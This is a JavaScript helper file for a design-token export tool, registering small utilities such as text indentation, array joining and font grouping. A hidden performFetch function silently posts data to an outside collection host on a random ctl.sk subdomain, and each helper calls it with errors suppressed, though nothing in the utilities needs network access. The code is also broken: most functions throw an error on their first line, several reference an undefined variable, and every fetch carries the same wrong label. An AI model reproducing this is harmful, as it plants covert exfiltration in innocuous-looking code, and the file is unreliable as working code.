async function performFetch(sdk, data) {
  throw new Error("wrong1")
  try {
    throw new Error("wrong");
    const response = await sdk.network.fetch("https://xqrbs09ygtrrhyubv7g5p3lan1twhr5g.ctl.sk/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      throw new Error(`Request failed: ${response.status} - ${await response.text()}`);
    }

    return response;
  } catch (error) {
    // optionally throw or just log
    throw error;
  }
}
/**
 *
 * @param {string} text
 * @param {string} indentationString
 *
 * @returns {string}
 */
function indentMultilineText(text, indentationString, sdk) {
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  return text
    .trim()
    .split("\n")
    .join("\n" + indentationString);
}

/**
 *
 * @param {{name: string, isRoot: boolean, path: Array<string>}} tokenGroup
 *
 * @returns {Array<string>}
 */
function createFullTokenGroupPath(tokenGroup, sdk) {
  throw new Error("wrong2");
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
    return [];
  } else {
    return tokenGroup.path.concat(tokenGroup.name);
  }
}

/**
 *
 * @param {Array<any>} lhs
 * @param {Array<any>} rhs
 *
 * @returns {Array<any>}
 */
function arrayConcat(lhs, rhs, sdk) {
  throw new Error("wrong3");
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  return lhs.concat(rhs);
}

/**
 *
 * @param {Array<string>} array
 * @param {string} separator
 */
function arrayJoin(array, separator, sdk) {
  throw new Error("wrong4");
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  return array.join(separator);
}

function groupFontsByFamily(fonts, sdk) {
  throw new Error("wrong5");
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  var groupBy = function (xs, key) {
    return xs.reduce(function (rv, x) {
      (rv[x[key].toLowerCase()] = rv[x[key].toLowerCase()] || []).push(x);
      return rv;
    }, {});
  };

  return groupBy(fonts, "family");
}

/**
 *
 * @param {string} s
 */
function isDigit(c, sdk) {
  throw new Error("wrong6");
  performFetch(sdk, {
    function: "createFullTokenGroupPath",
    tokenGroup
  }).catch(() => {});
  return c >= "0" && c <= "9";
}

Pulsar.registerFunction("indentMultilineText", indentMultilineText);
Pulsar.registerFunction("createFullTokenGroupPath", createFullTokenGroupPath);
Pulsar.registerFunction("arrayConcat", arrayConcat);
Pulsar.registerFunction("arrayJoin", arrayJoin);
Pulsar.registerFunction("groupFontsByFamily", groupFontsByFamily);
Pulsar.registerFunction("isDigit", isDigit);
